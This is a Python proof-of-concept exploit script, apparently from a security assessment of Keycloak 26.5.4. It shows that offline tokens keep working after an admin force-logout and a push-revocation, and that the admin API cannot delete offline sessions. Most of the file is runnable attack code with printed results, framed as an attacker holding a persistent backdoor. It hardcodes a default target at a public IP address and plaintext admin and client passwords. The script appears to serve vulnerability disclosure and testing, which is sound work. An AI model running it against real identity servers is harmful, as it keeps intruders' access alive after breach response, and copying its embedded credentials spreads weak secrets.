#!/usr/bin/env python3
"""
Finding #3: Offline Token Persistence After Admin Session Revocation
Severity: HIGH (CVSS 7.5)
Target: Keycloak 26.5.4

Demonstrates that offline tokens survive admin force-logout, push-revocation,
and that the admin API cannot delete individual offline sessions (404).
"""

import http.client
import json
import base64
import argparse
import sys
import urllib.parse

# ANSI colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

def banner():
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  Finding #3: Offline Token Persistence After Revocation      ║
║  Severity: HIGH (CVSS 7.5)                                   ║
║  Keycloak 26.5.4 — Improper Session Revocation              ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")

def step(num, msg):
    print(f"{CYAN}[*] Step {num}:{RESET} {msg}")

def success(msg):
    print(f"{GREEN}[+]{RESET} {msg}")

def fail(msg):
    print(f"{RED}[!]{RESET} {msg}")

def info(msg):
    print(f"{YELLOW}[*]{RESET} {msg}")

def http_post(host, port, path, body, headers=None):
    conn = http.client.HTTPConnection(host, port, timeout=15)
    hdrs = {"Content-Type": "application/x-www-form-urlencoded"}
    if headers:
        hdrs.update(headers)
    conn.request("POST", path, body, hdrs)
    resp = conn.getresponse()
    data = resp.read().decode()
    status = resp.status
    conn.close()
    return status, data

def http_get(host, port, path, headers=None):
    conn = http.client.HTTPConnection(host, port, timeout=15)
    hdrs = {}
    if headers:
        hdrs.update(headers)
    conn.request("GET", path, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode()
    status = resp.status
    conn.close()
    return status, data

def http_delete(host, port, path, headers=None):
    conn = http.client.HTTPConnection(host, port, timeout=15)
    hdrs = {}
    if headers:
        hdrs.update(headers)
    conn.request("DELETE", path, headers=hdrs)
    resp = conn.getresponse()
    resp.read()
    status = resp.status
    conn.close()
    return status

def get_token(host, port, realm, body):
    path = f"/realms/{realm}/protocol/openid-connect/token"
    status, data = http_post(host, port, path, body)
    return status, json.loads(data) if data else {}

def get_admin_token(host, port):
    body = "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234"
    status, data = get_token(host, port, "master", body)
    return data.get("access_token", "")

def main():
    parser = argparse.ArgumentParser(description="Finding #3: Offline Token Persistence PoC")
    parser.add_argument("--host", default="http://46.101.162.187:8080",
                        help="Keycloak base URL (default: http://46.101.162.187:8080)")
    args = parser.parse_args()

    url = args.host.rstrip("/")
    if "://" in url:
        url = url.split("://", 1)[1]
    if ":" in url:
        host, port = url.rsplit(":", 1)
        port = int(port)
    else:
        host, port = url, 8080

    banner()
    info(f"Target: {host}:{port}")
    realm = "test"
    client_id = "test-confidential"
    client_secret = "mysecret123"
    username = "testuser"
    password = "Password123"
    results = []
    print()

    # ── Step 0: Get admin token and user ID ──
    step(0, "Getting admin token and user ID...")
    admin_token = get_admin_token(host, port)
    if not admin_token:
        fail("Failed to get admin token")
        return 1
    success("Admin token obtained")

    auth_hdr = {"Authorization": f"Bearer {admin_token}"}
    status, data = http_get(host, port,
                            f"/admin/realms/{realm}/users?username={username}", auth_hdr)
    users = json.loads(data)
    user_id = users[0]["id"] if users else None
    if not user_id:
        fail("User not found")
        return 1
    success(f"User ID: {user_id}")

    status, data = http_get(host, port,
                            f"/admin/realms/{realm}/clients?clientId={client_id}", auth_hdr)
    clients = json.loads(data)
    client_uuid = clients[0]["id"] if clients else None
    success(f"Client UUID: {client_uuid}")
    print()

    # ── Step 1: Attacker obtains offline token ──
    step(1, "ATTACKER: Obtaining offline token with compromised credentials...")
    body = (f"client_id={client_id}&client_secret={client_secret}"
            f"&grant_type=password&username={username}&password={password}"
            f"&scope=offline_access")
    status, resp = get_token(host, port, realm, body)
    offline_token = resp.get("refresh_token", "")

    if not offline_token:
        fail(f"Failed to get offline token: {resp}")
        return 1

    # Verify it's really an offline token
    payload_b64 = offline_token.split(".")[1] + "=="
    try:
        claims = json.loads(base64.b64decode(payload_b64))
        token_type = claims.get("typ", "unknown")
    except Exception:
        token_type = "unknown"

    success(f"Offline token obtained (type: {token_type})")
    print(f"    Token: {offline_token[:60]}...")
    print()

    # ── Step 2: Verify offline token works (baseline) ──
    step(2, "Verifying offline token works (baseline)...")
    body = (f"client_id={client_id}&client_secret={client_secret}"
            f"&grant_type=refresh_token&refresh_token={offline_token}")
    status, resp = get_token(host, port, realm, body)
    if "access_token" in resp:
        success("Baseline: offline token exchange successful")
    else:
        fail(f"Baseline failed: {resp}")
        return 1
    print()

    # ── Step 3: Admin force-logout ──
    step(3, "ADMIN: Force-logout all user sessions...")
    # Refresh admin token
    admin_token = get_admin_token(host, port)
    auth_hdr = {"Authorization": f"Bearer {admin_token}"}

    logout_status, _ = http_post(host, port,
                                  f"/admin/realms/{realm}/users/{user_id}/logout",
                                  "", auth_hdr)
    print(f"    POST /users/{{id}}/logout: HTTP {logout_status}")

    # Verify active sessions are cleared
    status, data = http_get(host, port,
                            f"/admin/realms/{realm}/users/{user_id}/sessions", auth_hdr)
    sessions = json.loads(data) if data else []
    success(f"Active sessions remaining: {len(sessions)} (should be 0)")
    print()

    # ── Step 4: Test offline token after force-logout ──
    step(4, "ATTACKER: Testing offline token AFTER admin force-logout...")
    body = (f"client_id={client_id}&client_secret={client_secret}"
            f"&grant_type=refresh_token&refresh_token={offline_token}")
    status, resp = get_token(host, port, realm, body)
    if "access_token" in resp:
        fail("VULNERABLE — Offline token STILL WORKS after force-logout!")
        results.append(("After force-logout", True))
    else:
        success("Offline token revoked — not vulnerable")
        results.append(("After force-logout", False))
    print()

    # ── Step 5: Admin push-revocation ──
    step(5, "ADMIN: Pushing not-before revocation policy...")
    admin_token = get_admin_token(host, port)
    auth_hdr = {"Authorization": f"Bearer {admin_token}"}
    push_status, push_resp = http_post(host, port,
                                        f"/admin/realms/{realm}/push-revocation",
                                        "", auth_hdr)
    print(f"    POST /push-revocation: HTTP {push_status}")
    print()

    # ── Step 6: Test offline token after push-revocation ──
    step(6, "ATTACKER: Testing offline token AFTER push-revocation...")
    body = (f"client_id={client_id}&client_secret={client_secret}"
            f"&grant_type=refresh_token&refresh_token={offline_token}")
    status, resp = get_token(host, port, realm, body)
    if "access_token" in resp:
        fail("VULNERABLE — Offline token STILL WORKS after push-revocation!")
        results.append(("After push-revocation", True))
    else:
        success("Offline token revoked")
        results.append(("After push-revocation", False))
    print()

    # ── Step 7: Admin tries to DELETE offline sessions ──
    step(7, "ADMIN: Attempting to DELETE offline sessions via API...")
    admin_token = get_admin_token(host, port)
    auth_hdr = {"Authorization": f"Bearer {admin_token}"}

    del_status = http_delete(host, port,
                              f"/admin/realms/{realm}/users/{user_id}/offline-sessions/{client_uuid}",
                              auth_hdr)
    print(f"    DELETE /users/{{id}}/offline-sessions/{{clientId}}: HTTP {del_status}")
    if del_status == 404:
        fail("Admin API returns 404 — cannot delete offline sessions!")
        results.append(("DELETE offline sessions", True))
    else:
        success(f"Endpoint returned {del_status}")
        results.append(("DELETE offline sessions", del_status == 404))
    print()

    # ── Step 8: Verify offline sessions still exist ──
    step(8, "Checking if offline sessions still exist...")
    status, data = http_get(host, port,
                            f"/admin/realms/{realm}/users/{user_id}/offline-sessions/{client_uuid}",
                            auth_hdr)
    try:
        offline_sessions = json.loads(data)
        count = len(offline_sessions)
    except Exception:
        count = 0
    print(f"    Offline sessions remaining: {count}")
    if count > 0:
        fail(f"Offline sessions persist! ({count} active)")
    print()

    # ── Summary ──
    vuln_count = sum(1 for _, v in results if v)
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
║  RESULTS SUMMARY                                             ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")
    for name, vuln in results:
        status_str = f"{RED}VULNERABLE{RESET}" if vuln else f"{GREEN}NOT VULNERABLE{RESET}"
        print(f"  {name:35s} {status_str}")

    print(f"""
{YELLOW}Impact:{RESET}
  - Compromised account recovery is INCOMPLETE — force-logout does not
    revoke offline tokens
  - Push-revocation (notBefore) has NO effect on offline tokens
  - Admin REST API DELETE endpoint returns 404 — no programmatic way to
    revoke individual offline sessions
  - With default settings (no rotation, no expiry), a single offline token
    grants PERMANENT access until password change

{YELLOW}Attack Scenario:{RESET}
  1. Attacker compromises credentials → obtains offline token
  2. Security team detects breach → forces logout (appears successful)
  3. Attacker's offline token remains valid → persistent backdoor
  4. Only password change revokes the offline token

{YELLOW}Root Cause:{RESET}
  Offline sessions are stored in a separate persistence layer that is
  not affected by active session operations (logout, push-revocation).
""")

    if vuln_count > 0:
        print(f"{RED}{BOLD}[!] {vuln_count}/{len(results)} tests confirm vulnerability{RESET}")
        return 0
    else:
        print(f"{GREEN}[+] All tests passed — not vulnerable{RESET}")
        return 1

if __name__ == "__main__":
    sys.exit(main())
